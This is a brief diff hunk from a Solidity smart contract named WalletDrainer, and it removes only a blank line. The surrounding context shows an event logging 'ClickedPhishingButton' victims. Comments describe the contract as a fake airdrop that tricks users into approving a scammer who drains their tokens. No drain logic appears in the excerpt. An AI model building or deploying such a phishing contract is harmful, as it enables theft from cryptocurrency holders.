@@ -21,7 +21,6 @@ contract WalletDrainer {
     event ClickedPhishingButton(address indexed victim);
 }
 
-
 // This contract is a phishing contract that tricks users into approving a scammer to spend their tokens.
 // It allows the scammer to drain tokens from users who interact with it.
 // It simulates an airdrop and allows the scammer to drain tokens from users who interact with it.
